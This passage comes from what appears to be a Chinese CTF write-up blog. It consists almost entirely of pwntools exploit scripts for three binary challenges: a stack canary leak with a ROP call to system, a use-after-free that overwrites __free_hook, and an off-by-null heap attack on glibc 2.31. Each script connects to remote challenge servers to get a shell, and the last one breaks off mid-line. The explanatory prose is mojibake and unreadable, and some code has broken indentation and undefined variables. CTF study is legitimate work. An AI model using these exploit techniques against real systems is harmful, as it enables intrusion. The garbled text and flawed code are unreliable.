class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#context</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">SigreturnFrame(kernel = &#x27;amd64&#x27;)</span><br><span class="line"></span><br><span class="line">binary = &quot;./pwnpwn&quot;</span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line">#elf = ELF(binary)</span><br><span class="line">context.timeout = 0.2</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    p = process(context.binary)</span><br><span class="line">    #p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span><br><span class="line">    elf = ELF(context.binary)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;124.71.156.217&quot;,&quot;49155&quot;)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = &quot;your choice&gt;&gt;&quot;</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">	myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(&#x27;b *$rebase(0xdbd)&#x27;)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line">def gdb_b(addr):</span><br><span class="line">    gdb.attach(p, &quot;b *$rebase(&#123;0&#125;) \n c&quot;.format(addr))</span><br><span class="line">    sleep(0.5)</span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">system_addr = elf.plt[&#x27;system&#x27;]</span><br><span class="line">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span><br><span class="line"></span><br><span class="line">sla(&quot;welcome to mimic world,try something\n&quot;,&#x27;1&#x27;)</span><br><span class="line">ru(&quot;let us give you some trick\n0x&quot;)</span><br><span class="line">elf_base = int(rc(12),16) - 0x9b9</span><br><span class="line">lg(&quot;elf_base&quot;,elf_base)</span><br><span class="line">sl(&quot;2&quot;)</span><br><span class="line">ru(&quot;hello\n&quot;)</span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;M&quot;*(0x68)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(&quot;M&quot;*(0x68))</span><br><span class="line">canary = u64(rc(8))-0xa</span><br><span class="line">lg(&quot;canary&quot;,canary)</span><br><span class="line"></span><br><span class="line">payload1 = &quot;&quot;</span><br><span class="line">payload1 += &quot;D&quot;*(0x68)</span><br><span class="line">payload1 += p64(canary)</span><br><span class="line">payload1 += &quot;D&quot;*8</span><br><span class="line">payload1 += p64(elf_base + pop_rdi_ret)</span><br><span class="line">payload1 += p64(elf_base + 0x202010)</span><br><span class="line">payload1 += p64(elf_base + system_addr)</span><br><span class="line">payload1 += p64(elf_base + main_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sl(payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">#flag&#123;63YGBWA1c0pfPrLqhQPiiGJCOl7JWMD9&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="å…­ã€random-heap"   >
          <a href="#å…­ã€random-heap" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…­ã€random-heap" class="headerlink" title="å…­ã€random_heap"></a>å…­ã€random_heap</h1>
      <p>è¿™é“é¢˜ç›®æ¯”è¾ƒæœ‰æ„æ€ï¼Œè™½ç„¶æ˜¯æœ€ç®€å•çš„UAFï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ¯æ¬¡éƒ½ä¼šéšæœºæ›´æ¢binä¸­chunkçš„ä½ç½®ï¼Œä½†æ˜¯å¯¹åº”çš„ç´¢å¼•chunkå…¶å®è¿˜æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥ç›´æ¥çˆ†ç ´å°±å¥½ã€‚ä½†æ˜¯è¿™ä¸ªä¹Ÿå¯ä»¥é€šè¿‡å¡«æ»¡0x100ä»¥ä¸‹å¤§å°çš„tcacheæ¥æ›´å¤§æ¦‚ç‡getshellã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#context</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">SigreturnFrame(kernel = &#x27;amd64&#x27;)</span><br><span class="line"></span><br><span class="line">binary = &quot;./random_heap&quot;</span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line">#elf = ELF(binary)</span><br><span class="line">context.timeout = 0.2</span><br><span class="line"></span><br><span class="line">global p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">    p = process(context.binary)</span><br><span class="line">    #p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span><br><span class="line">    elf = ELF(context.binary)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&quot;124.71.140.198&quot;,&quot;49153&quot;)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = lambda s:p.send(s)</span><br><span class="line">sl = lambda s:p.sendline(s)</span><br><span class="line">rc = lambda s:p.recv(s)</span><br><span class="line">ru = lambda s:p.recvuntil(s)</span><br><span class="line">rl = lambda :p.recvline()</span><br><span class="line">sa = lambda a,s:p.sendafter(a,s)</span><br><span class="line">sla = lambda a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &#x27;\0&#x27;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &#x27;\0&#x27;))</span><br><span class="line">u64Leakbase = lambda offset :u64(ru(&quot;\x7f&quot;)[-6: ] + &#x27;\0\0&#x27;) - offset</span><br><span class="line">u32Leakbase = lambda offset :u32(ru(&quot;\xf7&quot;)[-4: ]) - offset</span><br><span class="line">it      = lambda                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = &quot;Your choice: &quot;</span><br><span class="line"></span><br><span class="line">def dockerDbg():</span><br><span class="line">	myGdb = remote(&quot;127.0.0.1&quot;,30001)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(&#x27;b *$rebase(0xdbd)&#x27;)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line">#b *$rebase(0xdbd)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line">def gdb_b(addr):</span><br><span class="line">    gdb.attach(p, &quot;b *$rebase(&#123;0&#125;) \n c&quot;.format(addr))</span><br><span class="line">    sleep(0.5)</span><br><span class="line"></span><br><span class="line">def lg(string,addr):</span><br><span class="line">    print(&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;%(string,addr))</span><br><span class="line"></span><br><span class="line">def add(idx,size):</span><br><span class="line">	sla(menu,&#x27;1&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">	sla(&#x27;Size: &#x27;,str(size))</span><br><span class="line">def edit(idx,con):</span><br><span class="line">	sla(menu,&#x27;2&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">	sla(&#x27;Content: &#x27;,con)</span><br><span class="line">def show(idx):</span><br><span class="line">	sla(menu,&#x27;3&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line">def delete(idx):</span><br><span class="line">	sla(menu,&#x27;4&#x27;)</span><br><span class="line">	sla(&#x27;Index: &#x27;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#normal UAF</span><br><span class="line">add(0,0x98)</span><br><span class="line">add(1,0x28)</span><br><span class="line">for i in range(8):</span><br><span class="line">	edit(0,&quot;D&quot;*16)</span><br><span class="line">	delete(0)</span><br><span class="line">#leak libc</span><br><span class="line">show(0)</span><br><span class="line">libc_base = u64Leakbase(96+0x10+libc.sym[&#x27;__malloc_hook&#x27;])</span><br><span class="line"></span><br><span class="line">__free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">lg(&quot;libc_base&quot;,libc_base)</span><br><span class="line">lg(&quot;__free_hook_addr&quot;,__free_hook_addr)</span><br><span class="line">lg(&quot;system_addr&quot;,system_addr)</span><br><span class="line">add(2,0x28)</span><br><span class="line">delete(2)</span><br><span class="line">edit(2,p64(__free_hook_addr)+p64(0))</span><br><span class="line">edit(1,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">dbg()</span><br><span class="line">#prented random</span><br><span class="line">while True:</span><br><span class="line">	try:</span><br><span class="line">		add(3,0x48)</span><br><span class="line">		add(4,0x48)</span><br><span class="line">		edit(4,p64(system_addr))</span><br><span class="line">		edit(3,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">		delete(3)</span><br><span class="line">		delete(4)</span><br><span class="line">	except:</span><br><span class="line">		it()</span><br><span class="line"></span><br><span class="line">#flag&#123;bdcef975ec2589f3e58d105d06587798&#125;</span><br></pre></td></tr></table></div></figure>


        <h1 id="ä¸ƒã€bornote"   >
          <a href="#ä¸ƒã€bornote" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸ƒã€bornote" class="headerlink" title="ä¸ƒã€bornote"></a>ä¸ƒã€bornote</h1>
      <p>è¿™é“é¢˜ç›®è´¼å‚»é€¼ï¼Œæœ€å¼€å§‹ä¾æ®urandomç”³è¯·äº†ä¸€ä¸ªéšæœºå¤§å°chunkï¼Œå¯¼è‡´å †å¸ƒå±€ä¼šå¤±æ•ˆã€‚ä½†æ˜¯ç”±äºé¢˜ç›®è®¾ç½®ï¼Œå®é™…ä¸Šä¹Ÿå°±å­˜åœ¨å¤§æ¦‚åæ¥ç§å¤§å°çš„chunkï¼Œé€‰ä¸€ä¸ªå®ä¾‹çˆ†ç ´ä¸€ä¸‹å³å¯ã€‚ä½†æ˜¯æœ€å¼€å§‹æˆ‘å±…ç„¶è¿˜ä»¥ä¸ºè¿™ä¸ªæ˜¯å¾ˆéšæœºçš„ï¼Œç›´æ¥å‡è®¾ç”³è¯·äº†240å¤§å°çš„Chunkï¼Œç»“æœçˆ†äº†ä¸€æ™šä¸Šéƒ½æ²¡çˆ†å‡ºæ¥ï¼Œå®åœ¨æ˜¯å‚»é€¼äº†ã€‚ä¹‹åå°±æ˜¯æ­£å¸¸çš„2.31ä¸‹çš„off by nulläº†ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./note&quot;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">libc = ELF(context.binary.libc.path)</span><br><span class="line"><span class="comment">#elf = ELF(binary)</span></span><br><span class="line">context.timeout = <span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;cmd: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dockerDbg</span>():</span></span><br><span class="line">	myGdb = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">    myGdb.interactive()</span><br><span class="line">    myGdb.sendline(<span class="string">&#x27;b *$rebase(0xdbd)&#x27;</span>)</span><br><span class="line">	myGdb.close()</span><br><span class="line">	pause()</span><br><span class="line"><span class="comment">#b *$rebase(0xdbd)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(&#123;0&#125;) \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">string,addr</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(string,addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&quot;Note: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	sla(<span class="string">&quot;username: &quot;</span>,<span class="string">&quot;DBDX&quot;</span>)</span><br><span class="line">	add(<span class="number">0x478</span>)</span><br><span class="line">	add(<span class="number">0x478</span>)</span><br><span class="line">	add(<span class="number">0x478</span>)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#0x9f0</span></span><br><span class="line">	add(<span class="number">0x118</span>)</span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&#x27;\x11&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">	add(<span class="number">0x418</span>) <span class="comment">#1 fd 0x---2b0</span></span><br><span class="line">	add(<span class="number">0x108</span>) <span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line">	add(<span class="number">0x438</span>) <span class="comment">#4 unlink_chunk 0x---c00</span></span><br><span class="line">	add(<span class="number">0x108</span>) <span class="comment">#5</span></span><br><span class="line">	add(<span class="number">0x428</span>) <span class="comment">#6 bk 0x---150</span></span><br><span class="line">	add(<span class="number">0x208</span>) <span class="comment">#7</span></span><br><span class="line">	<span class="comment">#left fd bk in 0x---c00</span></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line">	delete(<span class="number">6</span>)</span><br><span class="line">	<span class="comment">#merge and carve to get 0x---c20 and change size which in 0x---c00 </span></span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x438</span>) <span class="comment">#8 set size  			</span></span><br><span class="line">	edit(<span class="number">1</span>,<span class="string">&#x27;\x08&#x27;</span>*<span class="number">0x418</span> + <span class="string">&#x27;\x91&#x27;</span>+<span class="string">&#x27;\x0b&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#reply	</span></span><br><span class="line">	add(<span class="number">0x418</span>) <span class="comment"># 9 0x---c20 						</span></span><br><span class="line">	add(<span class="number">0x428</span>) <span class="comment"># 10 bk 0x---150 					</span></span><br><span class="line">	add(<span class="number">0x418</span>) <span class="comment"># 11 fd 0x---2b0 					</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#repair fd</span></span><br><span class="line">	delete(<span class="number">6</span>) <span class="comment">#0x---2b0  		11</span></span><br><span class="line">	delete(<span class="number">3</span>) <span class="comment">#0x---c20 		9</span></span><br><span class="line">	add(<span class="number">0x418</span>) <span class="comment"># 12 0x---2b0 to overflow \x00 in fd  	</span></span><br><span class="line">	edit(<span class="number">3</span>,<span class="string">&#x27;DBDXZNBA&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x418</span>) <span class="comment"># 13 0x---c20 							</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">#repair bk</span></span><br><span class="line">	delete(<span class="number">6</span>) 		<span class="comment">#13</span></span><br><span class="line">	delete(<span class="number">4</span>) 		<span class="comment">#4</span></span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x5f8</span>) <span class="comment">#14 let 0x---150 0x---c20 into largebin  	</span></span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x428</span>) <span class="comment"># 15 0x---150 to overflow \x00 in fd  				</span></span><br><span class="line">	edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#trigger off-by-null</span></span><br><span class="line">	edit(<span class="number">7</span>,<span class="string">&#x27;\x77&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0xb90</span>))</span><br><span class="line">	add(<span class="number">0x18</span>)			</span><br><span class="line">	delete(<span class="number">4</span>)</span><br><span class="line">	add(<span class="number">0x18</span>)			</span><br><span class="line">	add(<span class="number">0x3d8</span>)</span><br><span class="line">	show(<span class="number">4</span>)</span><br><span class="line">	ru(<span class="string">&quot;Note: &quot;</span>)</span><br><span class="line">	libc_base = u64Leakbase(<span class="number">96</span>+<span class="number">0x10</span>+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>])</span><br><span class="line">	free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	one = libc_base + <span class="number">0xe6c81</span></span><br><span class="line">	lg(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">	lg(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">	lg(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	add(<span class="number">0x48</span>)</span><br><span class="line">	add(<span class="number">0x18</span>)</span><br><span class="line">	</span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line">	delete(<span class="number">8</span>)</span><br><span class="line">	</span><br><span class="line">	edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x0</span>)</span><br><span class="line">		+p64(<span class="number">0x440</span>)+p64(<span 